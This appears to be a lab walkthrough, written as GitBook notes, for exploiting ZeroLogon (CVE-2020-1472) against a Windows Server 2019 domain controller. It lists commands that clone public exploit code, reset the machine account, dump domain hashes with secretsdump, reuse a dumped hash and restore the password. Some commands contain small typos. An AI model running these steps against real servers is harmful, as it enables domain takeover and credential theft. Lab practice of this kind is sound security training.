# Abusing ZeroLogon

What is ZeroLogon?



Steps&#x20;

1. sudo su
2. cd /opt
3. ls&#x20;
4. git clone [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
5. ls&#x20;
6. cd CVE-2020-1472
7. mousepad zerologon\_tester.py
8. copy code form [https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon\_tester.py](https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py) and paste in the file and save it.&#x20;
9. start win server 19 only and open Server Manager >> All Servers and note Server name and ip address.&#x20;
10. python3 zerologon\_tester.py SERVER\_NAME SERVER\_IP

    <figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

    IF SOMETHING SIMILER SHOWS THEN FOLLOW BELOW.
11. python3 cve-2020-1472-exploit.py SERVER\_NAME SERVER\_IP

    <figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>


12. "secretdump.py -just-dc DOMAIN\_NAME/SERVER\_NAME\\@SERVER\_IP" and it will ask for password leave it empty and press enter.&#x20;

    <figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>


13. Choose any user and hash and enter "secretsdump.py UID@SERVER\_IP -hashes HASH"

    <figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>


14. copy the plain\_password\_hex value.&#x20;

    <figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>


15. python3 restorepassword.py DOMAIN\_NAME/SERVER\_NAME@SERVER\_NAME -target-ip SERVER\_IP -hexpass PLAIN\_PASSWORD\_HEX&#x20;

    <figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>



Resources&#x20;

CVE-2020-1472 - [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

ZeroLogon testing script - [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
